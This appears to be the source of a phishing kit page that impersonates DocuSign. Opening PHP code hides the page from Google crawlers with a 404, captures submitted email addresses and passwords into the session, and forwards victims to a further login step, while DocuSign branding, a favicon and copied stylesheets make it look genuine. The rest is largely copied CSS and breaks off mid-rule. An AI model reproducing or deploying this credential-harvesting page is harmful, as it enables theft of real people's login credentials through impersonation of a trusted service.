<?php
include 'blockerz.php';
include 'sc.php';
session_start();
error_reporting(0);
@set_time_limit(0);
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false || strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false || strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'mozilla') !== false){ @header('HTTP/1.0 404 Not Found'); 
exit(); }

if(isset($_POST['email'])){
	$_SESSION['email'] = $_POST['email'];
	$_SESSION['pass'] = $_POST['password'];
	header('Location: Login.php');
	exit();
}
?>
<!DOCTYPE html >

<html lang="en">
<head>
    <script type="text/javascript">
        (function(global) {
            var times = {};
            //------------------------------------
            function LogTiming(action, startTime, endTime) {
                try {
                    var loggingOn = false;
                    if (!loggingOn) {
                        return;
                    }
                    var params = "&action=" + action;
                    //var pageName = "DocuSign.aspx";
                    var url = "DocuSignXML.aspx?logtiming=1" + GetTI(false);

                    if (startTime && endTime) {
                        params += "&starttime=" + startTime + "&endtime=" + endTime;
                    } else if (window.res_ServerTimeForLogging) {
                        // If no times specified assume we're using sever to generate start and end times
                        params += "&serverstarttime=" + global.EscapeAll(res_ServerTimeForLogging);
                    }

                    var xLogTiming = new global.XmlLoader(url);
                    xLogTiming.sendPost("application/x-www-form-urlencoded", "requestPage=" + global.EscapeAll(pageName) + params);
                } catch (err) {
                    // Make sure logging doesn't break anything 
                }
            }
            //------------------------------------
            function now() {
                return +(new Date());
            }
            //------------------------------------
            function recordTime(timeLabel) {
                try {
                    times[timeLabel] = now();
                } catch (err) {}
            }
            //------------------------------------
            // logDiff looks up startTimeLabel (created by recordTime) which is an accessor to the times object.
            // if no time is found in the times object matching startTimeLabel or startTimeLabel is undefined 
            // LogTime will use the server start time res_ServerTimeForLogging and serverEndTime when posted.
            // If endTimeLabel is undefined then we assume now() for endTime
            // Usage:
            //    a point in your JS code do:
            //      timeInfo.recordTime("anystartlabel")
            //    end point of the JS code you want to track
            //      timeInfo.recordTime("anyendlabel")
            //    then call logDiff to post to server
            //      timeInfo.logDiff("AnyAction", "anystartlabel", "anyendlabel");
            function logDiff(action, startTimeLabel, endTimeLabel) {
                try {
                    var endTime;
                    if (startTimeLabel != null) {
                        if (endTimeLabel == null) endTime = now();
                        else endTime = times[endTimeLabel];
                    }
                    LogTiming(action, times[startTimeLabel], endTime);
                } catch (err) {
                    // Make sure logging doesn't break anything 
                }
            }
            //------------------------------------
            var timeInfo = {
                recordTime: recordTime,
                logDiff: logDiff
            }
            //------------------------------------
            global.timeInfo = timeInfo;
        })(this);
        timeInfo.recordTime("JsExecStarted");
    </script>


    <meta name="robots" content="noindex, noarchive, nofollow, nosnippet" />
    <meta name="googlebot" content="noindex, noarchive, nofollow, nosnippet, noimageindex" />
    <meta name="slurp" content="noindex, noarchive, nofollow, nosnippet, noodp, noydir" />
    <meta name="msnbot" content="noindex, noarchive, nofollow, nosnippet" />
    <meta name="teoma" content="noindex, noarchive, nofollow, nosnippet" />
    <title>
        DocuSign
    </title>
    <link href="https://www.docusign.com/favicon.ico" rel="shortcut icon" type="image/x-icon" />
    <meta content="JavaScript" name="vs_defaultClientScript" />
    <meta content="C#" name="CODE_LANGUAGE" />
    <meta name="viewport" content="initial-scale=1.0" />
    <link id="ds_dsCss_styMartiniFonts" rel="stylesheet" href="//docucdn-a.akamaihd.net/signing/1.9.0/css/font-faces.css" type="text/css"></link>

    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css" integrity="sha384-9gVQ4dYFwwWSjIDZnLEWnxCjeSWFphJiwGPXr1jddIhOegiu1FwO5qRGvFXOdJZ4" crossorigin="anonymous">



    <style id="ds_dsCss_styHolder" type="text/css">
        body {
            margin: 0px;
            font-family: Helvetica, Arial, sans-serif !important;
            font-size: 12px;
            color: #333333;
            background-color: none;
            background-image: url(img/body_background.png);
            background-repeat: repeat;
        }

        input {
            font-family: Helvetica, Arial, sans-serif !important;
            font-size: 12px;
        }

        select {
            font-family: Helvetica, Arial, sans-serif !important;
            font-size: 12px;
        }

        textarea {
            font-family: Helvetica, Arial, sans-serif !important;
            font-size: 13px;
        }

        button {
            font-family: Helvetica, Arial, sans-serif !important;
            font-size: 13px;
        }

        a {
            font-family: Helvetica, Arial, sans-serif !important;
            color: #0D61AF;
            cursor: pointer;
            text-decoration: none;
            font-size: 13px;
        }

        a:hover {
            text-decoration: underline;
        }

        a.smaller {
            font-size: 11px;
        }

        .SubjectHeaderTxt {
            color: #999;
        }

        .BtnHighlight {
            width: 1px;
            position: absolute;
            background-color: #fff;
            top: 0px;
            height: 32px;
        }

        .Btnyellow_new {
            position: relative;
            cursor: pointer;
            text-decoration: none;
            white-space: nowrap;
            background-repeat: repeat-x;
            padding: 1px 15px;
            font-family: Helvetica, Arial, sans-serif !important;
            text-shadow: 0px 1px 1px rgba(255, 255, 255, 0.5);
            background-image: url(img/button_gradient.png);
            -moz-border-radius: 2px;
            -webkit-border-radius: 2px;
            border-radius: 2px;
            border: solid 1px #e7b236;
            ;
            font-size: 12px;
            font-weight: bold;
            min-height: 34px;
            background-color: #ffcc4a;
            color: #333333 !important;
        }

        .Btngray_reskin {
            border: solid 1px #cccccc;
            border-radius: 2px;
            -webkit-border-radius: 2px;
            -moz-border-radius: 2px;
            box-shadow: 0px 1px 3px 0px rgba(0, 0, 0, .15), inset 1px 1px 1px 1px rgba(255, 255, 255, 0.5);
            -webkit-box-shadow: 0px 1px 3px 0px rgba(0, 0, 0, .15), inset 1px 1px 1px 1px rgba(255, 255, 255, 0.5);
            -moz-box-shadow: 0px 1px 3px 0px rgba(0, 0, 0, .15), inset 1px 1px 1px 1px rgba(255, 255, 255, 0.5);
            background-image: url(img/button_gradient.png);
            background-repeat: repeat-x;
            font-size: 13px;
            margin: 2px;
            text-shadow: 0px 1px 1px rgba(255, 255, 255, 0.5);
            border: solid 1px #C6C6C6;
            background-color: #e2e2e2;
            color: #666666;
        }

        .Btngray_reskin:hover,
        .SigningHeaderButton:hover {
            background-image: url(img/button_gradient_34_hover.png);
        }

        .Btngray_reskin:active,
        .HeaderBtnyellow_new:active,
        .SigningHeaderButton:active {
            background-image: url(img/button_gradient_34_press.png);
        }

        .SigningHeaderButton {
            text-shadow: 0px 1px 1px rgba(255, 255, 255, 0.5);
            border: solid 1px #C6C6C6;
            background-color: #e2e2e2;
            color: #666666;
        }

        .Btngray_home {
            border: solid 1px #cccccc;
            border-radius: 2px;
            -webkit-border-radius: 2px;
            -moz-border-radius: 2px;
            box-shadow: 0px 1px 3px 0px rgba(0, 0, 0, .15);
            -webkit-box-shadow: 0px 1px 3px 0px rgba(0, 0, 0, .15);
            -moz-box-shadow: 0px 1px 3px 0px rgba(0, 0, 0, .15);
            background-color: #DCDCDC;
            background-image: url(img/button_gradient_40.png);
            background-repeat: repeat-x;
            font-size: 16px;
            color: #333333;
            position: relative;
            height: 40px;
            cursor: pointer;
        }

        .Btngray_home:hover {
            background-image: url(img/button_gradient_40_hover.png);
        }

        .Btngray_home:active {
            background-image: url(img/button_gradient_40_press.png);
        }

        .Btnyellow_reskin {
            background-image: url(img/button_autonav_gradient_40.png);
            background-color: #FFCC4A;
            background-repeat: repeat-x;
            border: 1px solid #e7b236;
            border-radius: 2px;
            -webkit-border-radius: 2px;
            -moz-border-radius: 2px;
            cursor: pointer;
            position: relative;
            text-decoration: none;
            font-weight: bold;
            width: 101px !important;
            height: 42px !important;
            text-shadow: 0px 1px 1px rgba(255, 255, 255, 0.5);
            color: #333333;
        }

        .Btnyellow_reskin_hover {
            background-image: url(img/button_autonav_gradient_40_on.png);
        }

        .Btnyellow_login {
            font-family: 'Maven Pro', Arial, sans-serif !important;
            font-weight: bold;
            font-size: 13px;
            letter-spacing: .6px;
            background-color: #ffc820;
            background-repeat: repeat-x;
            border: 1px solid transparent;
            border-radius: 2px;
            -webkit-border-radius: 2px;
            -moz-border-radius: 2px;
            cursor: pointer;
            position: relative;
            white-space: nowrap;
            text-decoration: none;
            margin: 0 !important;
            height: 34px !important;
            text-transform: uppercase;
            color: #333;
            padding: 0 18px;
            line-height: 30px;
            min-width: 0 !important;
        }

        .Btnyellow_login .BtnHighlight {
            display: none;
        }

        .Btnyellow_login_hover,
        .Btnyellow_login:hover {
            background-color: #f7ba00;
        }

        .Btnyellow_login:active {
            background-color: #eaa602;
        }

        .Btngray_login {
            font-family: 'Maven Pro', Arial, sans-serif !important;
            font-weight: bold;
            font-size: 13px;
            letter-spacing: .6px;
            background-color: #e9e9e9;
            background-repeat: repeat-x;
            border: 1px solid transparent;
            border-radius: 2px;
            -webkit-border-radius: 2px;
            -moz-border-radius: 2px;
            cursor: pointer;
            position: relative;
            white-space: nowrap;
            text-decoration: none;
            margin: 0 !important;
            height: 34px !important;
            text-transform: uppercase;
            color: #333;
            padding: 0 18px;
            line-height: 30px;
            min-width: 0 !important;
        }

        .Btngray_login .BtnHighlight {
            display: none;
        }

        .Btngray_login_hover,
        .Btngray_login:hover {
            background-color: #dcdcdc;
        }

        .Btngray_login:active {
            background-color: #dcdcdc;
        }

        .Btnyellow_home {
            background-image: url(img/button_autonav_gradient_40.png);
            background-repeat: repeat-x;
            border: 1px solid #e7b236;
            border-radius: 2px;
            box-shadow: 0px 1px 3px 0px rgba(0, 0, 0, .15);
            -webkit-box-shadow: 0px 1px 3px 0px rgba(0, 0, 0, .15);
            -moz-box-shadow: 0px 1px 3px 0px rgba(0, 0, 0, .15);
            -webkit-border-radius: 2px;
            -moz-border-radius: 2px;
            cursor: pointer;
            position: relative;
            font-size: 16px;
            text-decoration: none;
            width: 91px !important;
            height: 40px !important;
            text-shadow: 0px 1px 1px rgba(255, 255, 255, 0.5);
            color: #333333;
            cursor: pointer;
        }

        .Btnyellow_home:active {
            background-image: url(img/button_autonav_gradient_40_on.png);
        }

        .BtnHighlight40 {
            height: 40px !important;
            opacity: 0.2;
        }

        .Btnprimary {
            position: relative;
            cursor: pointer;
            text-decoration: none;
            white-space: nowrap;
            background-repeat: repeat-x;
            padding: 1px 15px;
            font-family: Helvetica, Arial, sans-serif !important;
            text-shadow: 0px 1px 1px rgba(255, 255, 255, 0.5);
            background-image: url(img/button_gradient.png);
            -moz-border-radius: 2px;
            -webkit-border-radius: 2px;
            border-radius: 2px;
            border: solid 1px #C6C6C6;
            font-size: 12px;
            font-weight: bold;
            min-height: 34px;
            background-color: #e2e2e2;
            color: #0D61AF;
        }

        .Btnprimary:hover {
            background-image: url(img/button_gradient_hover.png);
        }

        .Btnprimary:disabled {
            color: #bbbbbb;
        }

        .Btnsecondary {
            position: relative;
            cursor: pointer;
            text-decoration: none;
            white-space: nowrap;
            background-repeat: repeat-x;
            padding: 1px 15px;
            font-family: Helvetica, Arial, sans-serif !important;
            text-shadow: 0px 1px 1px rgba(255, 255, 255, 0.5);
            background-image: url(img/button_gradient.png);
            -moz-border-radius: 2px;
            -webkit-border-radius: 2px;
            border-radius: 2px;
            border: solid 1px #C6C6C6;
            font-size: 12px;
            font-weight: bold;
            min-height: 34px;
            background-color: #e2e2e2;
            color: #666666;
        }

        .Btnsecondary:hover {
            background-image: url(img/button_gradient_hover.png);
        }

        .Btnsecondary:disabled {
            color: #bbbbbb;
        }

        .Btntransparent {
            background-color: transparent;
            border: solid 1px transparent;
            cursor: pointer;
            font-weight: normal;
            position: relative;
            text-decoration: none;
            padding: 1px;
            margin: 0px 10px;
            font-size: 12px;
            min-height: 36px;
            border: solid 0px transparent;
            color: #0D61AF;
        }

        .DiaHCSignDialog,
        .DiaHCSignDialogSmall {
            position: absolute;
            top: 20px;
            right: 16px;
            padding: 5px 5px 0px 0px;
        }

        .Btntransparent:hover {
            text-decoration: underline;
        }

        .Btntransparent:disabled {
            color: #A0A0A0;
        }

        .Modal {
            position: absolute;
            z-index: 12;
            top: 0px;
            height: 500px;
            -ms-filter: 'progid:DXImageTransform.Microsoft.Alpha(Opacity=60)';
            filter: Alpha(opacity=60);
            opacity: .6;
            background-color: transparent !important;
            background-color: #FFFFFF;
            background-image: url(img/masknew.png) !important;
            background-image: none;
            background-repeat: repeat;
            left: 0px;
            width: 100%;
        }

        .DiaHTSignDialog {
            padding: 30px 35px 4px;
        }

        .DashboardArea {
            background: #fff;
            border: solid 1px #ccc;
            padding: 10px;
            clear: both;
            margin-top: 20px;
        }

        .DashboardLinkBoldText {
            font-weight: bold;
            font-size: 12px;
            color: #069;
            cursor: pointer;
        }

        .DashboardDisabledText {
            font-weight: bold;
            color: #9A9A9A;
        }

        .DashboardLinkBoldText:hover {
            text-decoration: underline;
        }

        .DashboardLinkText {
            font-weight: normal;
            font-size: 12px;
            color: #069;
            cursor: pointer;
        }

        .DashboardLinkText:hover {
            text-decoration: underline;
        }

        .DashboardLink11BoldText {
            font-weight: bold;
            font-size: 11px;
            color: #069;
            cursor: pointer;
        }

        .DashboardLink11BoldText:hover {
            text-decoration: underline;
        }

        .DashboardIdName {
            font-weight: normal;
            font-size: 18px;
            color: #000000;
            font-family: Helvetica, Arial, sans-serif !important;
        }

        .FieldLbl {
            padding: 2px 5px 0px 13px !important;
        }

        .Field {
            color: #333333;
            margin: 5px;
            padding: 2px 9px;
            resize: none;
            background-color: #FAFAFA;
            -moz-border-radius: 2px;
            -webkit-border-radius: 2px;
            border-radius: 2px;
            border: solid 1px #CCC;
        }

        .Field:focus {
            outline: none;
            border: solid 1px #333333;
        }

        .Field:disabled {
            color: #bbbbbb;
            background-color: #efefef;
            border: solid 1px #cccccc;
        }

        select.Field {
            padding: 1px 2px 1px 2px !important;
            -moz-border-radius: 3px !important;
            -webkit-border-radius: 3px !important;
            border-radius: 3px !important;
        }

        .FieldMissing {
            color: #999999;
        }

        .FieldNotMissing {
            color: #333333;
        }

        .FieldRequired {
            color: #333333;
            margin: 5px;
            padding: 2px 9px;
            resize: none;
            background-color: #FAFAFA;
            -moz-border-radius: 2px;
            -webkit-border-radius: 2px;
            border-radius: 2px;
            border: solid 1px #CCC;
        }

        .FieldNoEdit {
            margin: 5px;
            padding: 2px 9px;
            resize: none;
            -moz-border-radius: 2px;
            -webkit-border-radius: 2px;
            border-radius: 2px;
            border: solid 1px #CCC;
            border: solid 1px #CCC;
            background-color: #ffffff;
        }

        .FieldNoEdit:disabled {
            color: #bbbbbb;
            background-color: #efefef;
            border: solid 1px #cccccc;
        }

        .FieldNoEdit:hover {
            color: #333333;
            margin: 5px;
            padding: 2px 9px;
            resize: none;
            background-color: #FAFAFA;
            -moz-border-radius: 2px;
            -webkit-border-radius: 2px;
            border-radius: 2px;
            border: solid 1px #CCC;
        }

        .SigningGroupEmailDisabled:hover {
            background-color: #efefef;
        }

        .LogoutLinks {
            position: absolute;
            top: 0px;
            right: 25px;
            z-index: 1000;
        }

        .TabsHolder {
            position: relative;
            z-index: 100;
            min-height: 51px;
            background-color: #1E4CA1;
            background-image: url(img/header_noisegradient.png);
            background-repeat: repeat-x;
        }

        .TabsPointer {
            position: absolute;
            z-index: 101;
            top: 42px;
        }

        .Border {
            position: relative;
            min-width: 1024px;
            border-bottom: solid 1px #cccccc;
        }

        .Header {
            position: relative;
            background-color: transparent;
            background-image: url(img/subheader_background.png);
            background-repeat: repeat-x;
            background-position: bottom;
            min-height: 69px;
        }

        .HeaderContent {
            position: relative;
            margin: 0px 10px 0px 10px;
            float: left;
        }

        .HeaderLink {
            color: #0D61AF;
            font-size: 12px;
        }

        .Logo {
            position: relative;
            float: left;
            vertical-align: middle;
        }

        .LogoFrameL {
            margin: 0px 0px 0px 40px;
        }

        .LogoFrameR {
            margin: 0px 40px 0px 0px;
        }

        .LogoLeft {
            margin: 0px;
            cursor: pointer;
            background-color: #ffffff;
            background-image: url(img/header_logo_gradient.png);
            background-repeat: repeat-x;
            padding: 5px 0px;
            height: 37px;
        }

        .LogoRight {
            position: relative;
            margin: 5px 10px 2px 10px;
            float: right;
        }

        .FormBody {
            min-height: 300px;
            position: relative;
            margin: 0px;
            clear: both;
        }

        .Footer {
            min-width: 944px;
            text-align: right;
            padding: 0 40px;
        }

        .FooterLogin {
            position: absolute;
            padding: 0px;
            display: block;
        }

        .FooterImage {
            position: relative;
            float: left;
            margin-right: 20px;
        }

        .DiaHSignDialogSmall {
            overflow: visible;
        }

        #divLanguageSelected {
            *display: inline;
        }

        .FooterLinks {
            color: #999;
            display: inline-block;
            *display: inline;
            overflow: visible;
            position: relative;
        }

        .FooterLink {
            padding-top: 4px;
            display: inline-block;
            color: #999;
            font-size: 12px;
            cursor: pointer;
        }

        .FooterLink:hover {
            text-decoration: underline;
        }

        .FooterLink.set-mobile {
            padding-right: 15px;
        }

        .FooterMenuClosed {
            color: #999;
            display: none;
            z-index: 1000;
            cursor: pointer;
            min-width: 100px;
        }

        .FooterMenuClosed:hover {
            display: block;
            left: 0px;
            top: 0px;
            z-index: 1000;
            cursor: pointer;
            min-width: 100px;
            border: solid 1px #DEDEDE;
            -moz-border-radius: 10px;
            -webkit-border-radius: 10px;
            border-radius: 10px;
        }

        .SctClr {
            position: relative;
            clear: both;
            height: 1px;
            font-size: 1px;
        }

        .DefaultLinkBlue {
            color: #0D61AF;
        }

        .DefaultLinkDark {
            color: #000000;
        }

        .DefaultLinkLight {
            color: #FFFFFF;
        }

        .DefaultLink12 {
            font-size: 12px;
        }

        .DefaultLink,
        .DefaultLink:visited {
            text-decoration: none;
            cursor: pointer;
        }

        .DefaultLink:hover {
            text-decoration: underline;
            cursor: pointer;
        }

        .ToolSp {
            position: relative;
            height: 2px;
            font-size: 2px;
            background-image: url(img/options_spacer.png);
            background-repeat: repeat-x;
            margin-top: 3px;
            margin-bottom: 3px;
        }

        .ToolSpSmall {
            position: relative;
            height: 2px;
            font-size: 2px;
            background-image: url(img/options_spacer.png);
            background-repeat: repeat-x;
            margin-top: 1px;
        }

        .SearchTxtImg {
            position: absolute;
            right: 0px;
            cursor: pointer;
            vertical-align: middle;
            background-repeat: no-repeat;
            top: 0px;
            height: 32px;
            width: 32px;
            background-color: #e2e2e2;
            background-image: url(img/search_new_dark.png);
            -moz-border-radius: 0px 2px 2px 0px;
            -webkit-border-radius: 0px 2px 2px 0px;
            border-radius: 0px 2px 2px 0px;
            border: solid 1px #C6C6C6;
        }

        .SearchTxtImg:hover {
            background-image: url(img/search_new_dark_hover.png);
        }

        .SearchField {
            padding: 2px 30px 2px 7px !important;
            height: 28px;
            width: 200px;
            margin-top: 0px;
            border: solid 1px #C6C6C6 !important;
        }

        .DIA {
            position: absolute;
            z-index: 500;
            min-width: 385px;
        }

        .DIASCREEN {
            position: fixed !important;
            z-index: 500;
        }

        .DIAFLOW {
            position: relative;
            margin: 0px 10px;
            width: 1015px;
        }

        .DIAFLOWLEFTONLY {
            position: relative;
            margin: 0px 10px;
            width: 242px;
        }

        .Correcting {
            position: relative;
            margin: 0px 10px;
            width: 1015px;
            font-size: 20px;
            padding: 6px;
        }

        .ErrorMessageText {
            font-weight: bold;
            font-size: 11px;
            color: #DC143C;
        }

        .ContentTextBoldBlue {
            font-weight: bold;
            font-size: 12px;
            color: #0073cf;
        }

        .ContentTextBlue {
            font-weight: normal;
            font-size: 12px;
            color: #0073cf;
        }

        .Page {
            margin: 30px 0px 0px 55px;
            position: relative;
            background-color: #646464;
            clear: both;
            border: solid 1px #c4c4c4;
            ;
            -moz-box-shadow: 2px 2px 8px #646464;
            -webkit-box-shadow: 2px 2px 8px #646464;
            box-shadow: 2px 2px 8px #646464;
        }

        .PageIdentifier {
            margin: 0px 0px 0px 55px;
            position: relative;
            background-color: transparent;
            padding-top: 6px;
        }

        .CurrentFilter {
            font-size: 12px;
        }

        .BorderRoundGray {
            padding: 5px;
            -moz-border-radius: 5px;
            -webkit-border-radius: 5px;
            border-radius: 5px;
            border: solid 1px #CFCFCF;
        }

        .histEntityTitle {
            color: #999999;
            font-size: 14px;
        }

        .histEntityContent {
            color: #333333;
            font-size: 14px;
        }

        .historyDataRow {
            margin-bottom: 4px;
            font-size: 14px;
            color: #333333;
            border-bottom: solid 1px #e8e8e8;
            float: left;
            width: 100%;
        }

        .timeColumn {
            display: inline-block;
            vertical-align: top;
            width: 14%;
            margin-right: 10px;
            float: left;
        }

        .userColumn {
            display: inline-block;
            vertical-align: top;
            width: 20%;
            margin-right: 10px;
            float: left;
        }

        .actionColumn {
            display: inline-block;
            vertical-align: top;
            width: 12%;
            margin-right: 10px;
            float: left;
        }

        .activityColumn {
            display: inline-block;
            vertical-align: top;
            width: 37%;
            margin-right: 10px;
            float: left;
        }

        .statusColumn {
            display: inline-block;
            vertical-align: top;
            width: 8%;
        }

        .TabCommon {
            cursor: pointer;
            float: left;
            position: relative;
            font-size: 14px;
            text-align: center;
            margin-left: 0px;
            padding-left: 5px;
            padding-right: 5px;
            border-left: solid 1px #143169;
            border-right: 1px solid transparent;
            bottom: 0px;
            color: #FFFFFF;
        }

        .TabSmall {
            font-weight: bold;
            border: 1px solid #C6C6C6 !important;
            font-size: 12px;
            min-width: 70px !important;
            min-height: 24px !important;
            padding-top: 9px;
            background-image: url(img/button_gradient.png);
            background-repeat: repeat-x;
            background-color: #e2e2e2;
            color: #666666;
        }

        .TabSelSmall {
            font-weight: bold;
            border: none !important;
            font-size: 12px;
            min-width: 72px !important;
            min-height: 25px !important;
            padding-top: 10px;
            background-color: #1E4CA1;
            color: #FFFFFF;
        }

        .TabBig {
            font-size: 13px;
            font-weight: bold;
            height: 29px !important;
            min-width: 100px !important;
            padding-top: 16px;
        }

        .TabSelBig {
            font-size: 13px;
            font-weight: bold;
            border-right: 1px solid transparent;
            border-bottom: solid 1px #143169;
            background-color: #143169;
            height: 29px !important;
            min-width: 100px !important;
            padding-top: 16px;
        }

        .TabOuter {
            border-right: solid 1px #143169;
            float: left;
            position: relative;
        }

        .TabOuterSmall {
            float: left;
            position: relative;
            -moz-border-radius: 2px;
            -webkit-border-radius: 2px;
            border-radius: 2px;
        }

        .TabSpace {
            float: left;
            height: 10px;
            position: relative;
            width: 280px;
        }

        .HeaderTextStyle {
            font-size: 13px;
            font-weight: bold;
            font-size: 13px;
            font-weight: bold;
            color: #FFFFFF;
        }

        .HeaderBackground {
            background-color: #1E4CA1;
        }

        .ActionsMenu {
            display: block;
            z-index: 1000;
            cursor: pointer;
            min-width: 100px;
            background-color: #FAFAFA;
            border: solid 1px #A4A4A4;
            -moz-box-shadow: 0px 0px 6px 0px rgba(0, 0, 0, 0.3);
            -webkit-box-shadow: 0px 0px 6px 0px rgba(0, 0, 0, 0.3);
            box-shadow: 0px 0px 6px 0px rgba(0, 0, 0, 0.3);
            -moz-border-radius: 2px;
            -webkit-border-radius: 2px;
            border-radius: 2px;
            color: #333333;
        }

        .ActionsMenuManage {
            display: block;
            z-index: 1000;
            cursor: pointer;
            position: absolute;
            min-width: 150px;
            -moz-border-radius: 0px 0px 2px 2px;
            -webkit-border-radius: 0px 0px 2px 2px;
            border-radius: 0px 0px 2px 2px;
            -moz-box-shadow: 0px 0px 6px 0px rgba(0, 0, 0, 0.3);
            -webkit-box-shadow: 0px 0px 6px 0px rgba(0, 0, 0, 0.3);
            box-shadow: 0px 0px 6px 0px rgba(0, 0, 0, 0.3);
            background-color: #fff;
            border: solid 1px #ccc;
            -moz-box-shadow: 0px 0px 6px 0px rgba(0, 0, 0, 0.3);
            -webkit-box-shadow: 0px 0px 6px 0px rgba(0, 0, 0, 0.3);
            box-shadow: 0px 0px 6px 0px rgba(0, 0, 0, 0.3);
        }

        .ActionsMenuClosed {
            display: block;
            left: 0px;
            top: 0px;
            z-index: 1000;
            cursor: pointer;
            min-width: 100px;
            border: solid 1px transparent;
        }

        .ActionsMenuClosedNoHover {
            display: block;
            left: 0px;
            top: 0px;
            z-index: 1000;
            cursor: default;
            min-width: 100px;
            border: solid 1px transparent;
        }

        .ActionsMenuDisabled {
            color: #bbbbbb;
        }

        .ActionsMenuClosed:hover {
            display: block;
            left: 0px;
            top: 0px;
            z-index: 1000;
            cursor: pointer;
            min-width: 100px;
            background-color: #FAFAFA;
            border: solid 1px #A4A4A4;
            -moz-box-shadow: 0px 0px 6px 0px rgba(0, 0, 0, 0.3);
            -webkit-box-shadow: 0px 0px 6px 0px rgba(0, 0, 0, 0.3);
            box-shadow: 0px 0px 6px 0px rgba(0, 0, 0, 0.3);
            -moz-border-radius: 2px;
            -webkit-border-radius: 2px;
            border-radius: 2px;
        }

        .ActionMenuShowDown {
            left: 0px;
            top: 0px;
        }

        .ActionMenuShowDownNew {
            left: 0px;
            top: 0px;
            float: right;
            border: solid 1px transparent;
            background-color: #143169;
        }

        .ActionMenuShowUp {
            left: 0;
            bottom: 20px;
            position: absolute;
        }

        .ActionMenuItemTop {
            display: block;
            clear: both;
            padding-top: 5px;
            padding-left: 10px;
            white-space: nowrap;
            height: 24px;
            -moz-border-radius: 2px 2px 0px 0px;
            -webkit-border-radius: 2px 2px 0px 0px;
            border-radius: 2px 2px 0px 0px;
        }

        .ActionMenuItemTopSmall {
            display: block;
            clear: both;
            white-space: nowrap;
            height: 5px;
            -moz-border-radius: 2px 2px 0px 0px;
            -webkit-border-radius: 2px 2px 0px 0px;
            border-radius: 2px 2px 0px 0px;
        }

        .ActionMenuItemBottom {
            display: block;
            clear: both;
            border-top: solid 0px #999999;
            padding-top: 0px;
            padding-right: 0px;
            padding-left: 0px;
            white-space: nowrap;
            height: 5px;
            -moz-border-radius: 0px 0px 2px 2px;
            -webkit-border-radius: 0px 0px 2px 2px;
            border-radius: 0px 0px 2px 2px;
        }

        .ActionMenuItem {
            display: block;
            clear: both;
            padding-top: 6px;
            padding-bottom: 6px;
            padding-right: 10px;
            padding-left: 10px;
            white-space: nowrap;
        }

        .ActionMenuItemHover,
        .ActionMenuItem:hover {
            display: block;
            clear: both;
            padding-top: 6px;
            padding-bottom: 6px;
            padding-right: 10px;
            padding-left: 10px;
            white-space: nowrap;
            background-color: #e4e4e4;
        }

        .ActionMenuFltLeft {
            position: relative;
            float: left;
            margin: 5px 0px 5px 0px;
            vertical-align: top;
        }

        .ActionMenuFltLeftSpace {
            height: 1px;
            font-size: 1px;
            z-index: 19;
        }

        .ActionMenuItemFltTop {
            position: relative;
            padding: 2px;
            padding-left: 5px;
            white-space: nowrap;
            -webkit-border-radius: 5px 5px 0px 0px;
            -moz-border-radius: 5px 5px 0px 0px;
            border-radius: 5px 5px 0px 0px;
        }

        .ActionMenuItemImg {
            position: relative;
            vertical-align: middle;
            margin: 0px 5px 0px 5px;
            border: none;
        }

        .TightMenuItem {
            display: block;
            clear: both;
            padding: 0px 0px 0px 0px;
            white-space: nowrap;
            height: 24px;
        }

        .AccountMenuNew {
            background-color: #fff;
            border: solid 1px #ccc;
            background-color: #FFFFFF;
            position: absolute;
            right: 10px;
            top: 50px;
            -moz-border-radius: 2px;
            -webkit-border-radius: 2px;
            border-radius: 2px;
            -moz-box-shadow: 0px 0px 6px 0px rgba(0, 0, 0, 0.3);
            -webkit-box-shadow: 0px 0px 6px 0px rgba(0, 0, 0, 0.3);
            box-shadow: 0px 0px 6px 0px rgba(0, 0, 0, 0.3);
        }

        #ds_divUserAccountsMenuNew:hover {
            border: solid 1px transparent;
            background-color: #143169;
        }

        .AccountOpenMenuNew {
            padding-left: 10px;
            padding-right: 10px;
            white-space: nowrap;
            width: 80px;
            min-width: 80px;
            height: 40px;
            padding-top: 5px;
            border-left: solid 1px #143169;
            border-right: solid 1px #143169;
        }

        .AccountSelected {
            height: 29px;
            text-align: right;
            padding-top: 9px;
            margin-right: 20px;
            float: left;
            font-size: 11px;
            color: #FFFFFF;
        }

        .UpdateAccount {
            float: left;
            margin-right: 10px;
            padding-top: 9px;
            font-size: 11px;
            color: #FFFFFF;
        }


        .RowHeaderCell {
            border-right: solid 1px transparent;
            border-left: solid 1px transparent;
            border-bottom: solid 1px #ccc;
            background-color: #fff;
            height: 23px;
            vertical-align: middle;
            border-top: none;
            white-space: nowrap;
            padding-left: 4px;
            padding-right: 4px;
            cursor: pointer;
        }

        .RowHeaderCell:hover {
            text-decoration: underline;
        }

        .RowHeaderCellNoClick {
            border-right: solid 1px transparent;
            border-left: solid 1px transparent;
            border-bottom: solid 1px #ccc;
            background-color: #fff;
            height: 23px;
            vertical-align: middle;
            border-top: none;
            white-space: nowrap;
            padding-left: 4px;
            padding-right: 4px;
        }

        .RowHeaderSectionBorder {
            border-right: solid 1px #FFFFFF;
            border-left: solid 1px #FFFFFF;
            border-top: solid 1px #DFDFDF;
            border-bottom: solid 1px #DFDFDF;
        }

        .RowHeaderSorted {
            background-image: url(img/row_col_sorted.png) !important;
            background-position: bottom !important;
        }

        .RowHeaderCellAlignCenter {
            text-align: center;
        }

        .RowHeaderCellLeft {
            border-left: solid 0px #CCCCCC;
        }

        .RowHeaderCellRight {
            border-right: solid 0px #CCCCCC;
        }

        .RowHeaderLink,
        .RowHeaderLink:hover,
        .RowHeaderLink:visited {
            color: #0073cf;
            text-decoration: none;
            cursor: pointer;
        }

        .RowHeaderLinkDisabled {
            color: #dedede;
            text-decoration: none;
            cursor: default;
        }

        .RowNoHover {
            border-left: solid 0px #cccccc;
            border-right: solid 0px #cccccc;
            border-top: solid 1px #cccccc;
            border-bottom: solid 1px #cccccc;
            background-color: #ffffff;
            height: 25px;
            cursor: default;
        }

        .RowAltNoHover {
            border-left: solid 0px #cccccc;
            border-right: solid 0px #cccccc;
            border-top: solid 1px #cccccc;
            border-bottom: solid 1px #cccccc;
            background-color: #ffffff;
            height: 25px;
            cursor: default;
        }

        .RowCellSubHead {
            border-left: solid 0px #cccccc;
            border-right: solid 0px #cccccc;
            border-top: solid 2px #cccccc;
            border-bottom: solid 1px #cccccc;
            padding: 3px 4px;
        }

        .Row {
            border-left: solid 0px #cccccc;
            border-right: solid 0px #cccccc;
            border-top: solid 1px #cccccc;
